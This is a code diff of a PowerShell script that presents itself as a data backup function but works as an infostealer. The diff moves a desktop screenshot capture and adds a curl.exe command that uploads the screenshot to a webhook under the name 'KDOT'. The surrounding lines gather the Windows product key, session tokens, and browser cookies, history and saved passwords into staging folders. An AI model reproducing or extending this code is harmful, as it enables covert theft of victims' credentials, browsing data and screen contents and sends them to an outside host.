@@ -316,24 +316,6 @@ function Backup-Data {
     $alldiskinfo > $folder_general\diskinfo.txt
 
 
-	# Desktop screenshot
-    if (!($udc_mode)) {
-        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-        $screens = [Windows.Forms.Screen]::AllScreens
-        $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
-        $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
-        $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
-        $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
-        $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-        $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
-        $graphics = [Drawing.Graphics]::FromImage($bmp)
-        $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-        $bmp.Save("$folder_general\desktop-screenshot.png")
-        $graphics.Dispose()
-        $bmp.Dispose()
-    }
-
-
 	function Get-ProductKey {
         try {
             $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
@@ -950,8 +932,6 @@ function Backup-Data {
     }
     Invoke-GrabFiles
 
-    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$folder_general\desktop-screenshot.png\`"" $webhook | out-null
-
     $items = Get-ChildItem -Path "$folder_general" -Filter out*.jpg
     foreach ($item in $items) {
         $name = $item.Name
@@ -987,7 +967,9 @@ function Backup-Data {
     $proc.WaitForExit()
 
     $main_temp = "$env:LOCALAPPDATA\Temp"
+    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$main_temp\desktop-screenshot.png\`"" $webhook | out-null
     Move-Item "$main_temp\tokens.txt" $folder_general -Force	
+    Move-Item "$main_temp\desktop-screenshot.png" $folder_general -Force
 	Move-Item -Path "$main_temp\browser-cookies.txt" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\browser-history.txt" -Destination "$browser_data" -Force
     Move-Item -Path "$main_temp\browser-passwords.txt" -Destination "$browser_data" -Force
